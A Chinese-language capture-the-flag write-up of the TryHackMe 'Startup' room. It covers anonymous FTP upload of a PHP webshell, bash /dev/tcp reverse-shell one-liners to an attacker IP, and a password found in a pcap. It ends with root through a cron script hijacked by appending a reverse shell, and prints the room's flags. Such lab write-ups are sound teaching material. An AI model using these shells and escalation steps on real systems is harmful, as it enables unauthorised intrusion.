# Startup Writeup
> URL : https://tryhackme.com/room/startup
Target IP : 10.10.37.216

## Scan
- 老規矩 nmap 起手式
    - `nmap -A 10.10.37.216`
    - ![](https://i.imgur.com/gD14ZAk.png)
    - 有開
        - 21 FTP
            - nmap 說 Anonymous allow
        - 22 SSH
        - 80 網頁
- 掃網頁路徑
    - `python3 dirsearch.py -u http://10.10.37.216/ -e all`
    - 可能有用的路徑
        - `http://10.10.37.216/files/`
            - 裡面有一段話，跟 meme
            - ![](https://i.imgur.com/sQxCqzk.png)

## FTP
- `ftp 10.10.37.216`
    - 帳號 : `Anonymous`
    - 密碼 : 空白
    - ![](https://i.imgur.com/SyLMZqo.png)
    - 發現路徑就是網頁伺服器的files
- 嘗試上傳檔案
    - 根目錄(網頁的 `files`)
        - ![](https://i.imgur.com/1bxN7s9.png)
        - 沒有權限
    - ftp 目錄
        - ![](https://i.imgur.com/uQql93e.png)
        - 有權限ㄌ!
## Shell
- 訪問 `http://10.10.37.216/files/ftp/b374k.php`
    - 使用預設密碼
- 轉用 Reverse Shell
    - 本地端準備 `nc -vlk 7877`
    - 在 Terminal 輸入 `bash -c 'bash -i >& /dev/tcp/10.14.7.198/7877 0>&1'`
- 切換為交互式 shell
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
## 亂逛系統
- 根目錄底下
    - `recipe.txt`
        - `Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.`
        - 問題 : What is the secret spicy soup recipe? 
        - 答案 : `love`
    - incidents 資料夾
        - 裡面有 suspicious.pcapng
        - 透過 webshell 把他載下來備用
- 使用者相關
    - `/home` 底下有 `lennie` 使用者
## 解析 pcap
- 觀察第 45 個封包 follow TCP stream
    - 可以看到 webshell 的紀錄
    - ![](https://i.imgur.com/QWan7Ig.png)
    - 其中輸入了密碼 `c4ntg3t3n0ughsp1c3`
## 嘗試登入使用者
- 回到 reverse shell 輸入 `su lennie` 並搭配上述密碼
    - ![](https://i.imgur.com/VIqV6QA.png)
    - 登入成功!! 
- 取得 user.txt
    - ![](https://i.imgur.com/GjOqlxS.png)
    - `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`
## 研究提權
- 在使用者資料夾裡找到 scripts 資料夾
    - ![](https://i.imgur.com/eKvbNwQ.png)
    - 兩個檔案權限都是 root，但我們可以進行讀取
    - `planner.sh`
        - ```
          #!/bin/bash
          echo $LIST > /home/lennie/scripts/startup_list.txt
          /etc/print.sh
          ```
        - 看起來會把環境變數 $LIST 給寫到 startup_list.txt
        - 接著呼叫 `/etc/print.sh`
    - 觀察 `/etc/print.sh` 可以發現我們有 write 的權限
        - `-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh`
    - 在 `print.sh` 下面加上一行 reverse shell
        - `echo "bash -c 'bash -i >& /dev/tcp/10.14.7.198/8778 0>&1'" >> /etc/print.sh`
        - 當然這邊的 port 要跟目前的不同，然後本地開 `nc -vlk 8778` 來聽
        - 然後連指令都還沒執行，就莫名地拿到 root ㄌ ?__?
        - ![](https://i.imgur.com/6BoTO1i.png)
        - `THM{f963aaa6a430f210222158ae15c3d76d}`
        
## 為什麼誤打誤撞拿到 root ㄌ，還是要來研究一下
- 跑 Linpeas
    - 準備 `linpeas.sh` 在本地
        - `python3 -m http.server`
    - 回到使用者端
        - `wget 10.14.7.198:8000/linpeas.sh`
        - `bash linpeas.sh | tee meow.txt`
            - 看不出什麼結果
- 使用 Pspy
    - 用上述同樣方法載到被駭機觀察
    - ![](https://i.imgur.com/elNkToE.png)
    - 發現每分鐘都會用 UID=0 執行一次 `planner.sh`
    - 所以應該是一個 root 的 cron job
- 進入root後
    - 輸入 `crontab -l`
        - ![](https://i.imgur.com/AEcjHhe.png)
        - 就能看到這條 cron job 了
    - 我還是覺得這一段有一點點通靈 QQ